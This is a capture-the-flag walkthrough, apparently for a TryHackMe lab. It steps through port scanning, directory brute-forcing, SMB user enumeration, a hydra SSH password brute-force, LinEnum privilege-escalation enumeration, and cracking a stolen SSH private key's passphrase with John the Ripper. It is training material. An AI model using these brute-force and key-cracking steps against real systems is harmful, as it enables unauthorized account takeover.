# Web App Testing and Privilege Escalation 

In these set of tasks you'll learn the following:

    brute forcing 
    hash cracking 
    service enumeration
    Linux Enumeration


# Questions
## Q1
Deploy the machine and connect to our network "  
Steps="Start by connecting your openvpn inorder to Connect to try hack me.  
Start machine.  
ipaddress : 10.10.67.50  
A="none needed"

## Q2
Find the services exposed by the machine.

Steps
```sh

nmap -sC -sV  10.10.67.50 | tee nmap_scan.txt
```
## Results

```sh

PORT     STATE    SERVICE     VERSION
22/tcp   open     ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open     http        Apache httpd 2.4.18 ((Ubuntu))
139/tcp  open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
4126/tcp filtered ddrepl
8009/tcp open     ajp13?
8080/tcp open     http-proxy?

```

What is the name of the hidden directory on the web server.
Steps=run gobuster or dirb.  
Syntax
```sh
	"gobuster dir -u 10.10.67.50 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt |tee gobuster_results.txt"
	"dirb http://10.10.138.88/ /usr/share/wordlists/dirb/common.txt"
	#dirb will take longer
```
## Results
```sh
/development          (Status: 301) [Size: 316] [--> http://10.10.67.50/development/]
```
A=development


## Q3
User brute-forcing to find the username & password.  
Steps  
use enum4linux program to find users.  
Syntax
```sh
	enum4linux 10.10.67.50 |tee enumeration.txt
```
## Results
```sh

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''

S-1-22-1-1000 Unix User\kay (Local User)
S-1-22-1-1001 Unix User\jan (Local User)

```
## Q4
What is the username?  
A="jan"

## Q5
What is the password?  
Steps=here we are going to use hydra.  
Syntax
```sh

	hydra -l jan -P /usr/share/wordlists/rockyou.txt 10.10.67.50 ssh
```
## Result
```sh

	[22][ssh] host: 10.10.66.49   login: jan   password: ....
```
A="...."

## Q6
What service do you use to access the server.  
A="SSH"


## I restarted my machine \*notice change in ip address

# Q7
Enumerate the machine to find any vectors for privilege escalation.  
Steps  
	"log in as jan"  
syntax
```sh
	ssh jan@10.10.205.103
	passwod:...
	cd .. to get to the home directory where you will find kay as a user
```
But can't read the file 'pass.bat' in kay.  
I will open a new terminal in my machine.  
I will use LinEnum To get escalated privilege.  
syntax
```sh
	git clone https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```
After downloading the linEnum.sh script, i should copy the script to the target machine. In order to do that I’ll use SCP.  
syntax
```sh
	scp LinEnum.sh jan@10.10.205.103 :/dev/shm
```

Back to jan's machine.  
I’ll make it executable and run it.  
syntax
```sh
	chmod +x LinEnum 
	./LinEnum
 ```
Now this is interesting. Vim.basic is a SUID file, meaning we can run it with root privileges.

# Q8
What is the name of the other user you found.  
A="kay"

# Q9
If you have found another user, what can you do with this information?  
Steps   
Doing a thorough look we can find out something interesting in Kay’s .ssh directory.  
There is a private key!  
	"id_rsa"  
try logging in to kay oops!!  we are missing a passphrase.

We can use john the ripper to crack this, specifically ssh2john.  
Located in "/usr/share/john/ssh2john"  
First copy the private key to my Computer.  
Before I start I need to make the id_rsa file compatible with JohnTheRipper.  
In order to that I’ll use ssh2john.py.
```sh
	/usr/share/ssh2john.py kay_id_rsa > john_hash.txt
```
Run JohnTheRipper with rockyou.txt wordlist.
```sh
	john john_hash.txt -w=/usr/share/wordlists/rockyou.txt
```
Yay! I’ve found the password of the private key.

## Result  
password:...

# Q10
What is the final password you obtain?   
Steps  
	still as jay login to kay  
Syntax  
```sh
	"ssh kay@10.10.225.25 -i /home/kay/.ssh/id_rsa"
	#password:...
```


# TOOLS INTERACTED WITH
- NMAP
- GOBUSTER
- DIRBUSTER
- ENUM4LINUX
- HYDRA
- LINENUM 
- JOHNHTERIPPER


# ROUTE 2
STEP1   
- RUN NMAP(FOR PORTS)

STEP2  
- RUN NMAP(FOR DIRECTORIES)  
	sudo nmap -p80 --script=http-enum 10.10.228.161

STEP3
- PRESENCE OF SMB SUGGESTS WE RUN ENUM4LINUX  
	enum4linux 10.10.117.18  

STEP4  
- RUN smbclient   
	smbclient //10.10.117.18/Anonymous

STEP 5  
- BRUTEFORCE USING HYDRA  
	hydra -l jan -P /usr/share/wordlists/rockyou.txt  

STEP 6   
- SSH INTO JAN   
	ssh jan@<ip>  
	password = ...

STEP 7  
- ENUMERATE THE USER JAN DIRECTORIES SEARCHING FOR SOMETHING   
  RUN LINPEAS OR LINENUM

STEP 6  
- DOWNLOAD THE KEY INTO YOUR MACHINE  
- DECRYPT THE SSH KEY USING JOHN THE RIPPER  

# THAT'S THE END HOPE YOU LEARNED A NEW TRICK.
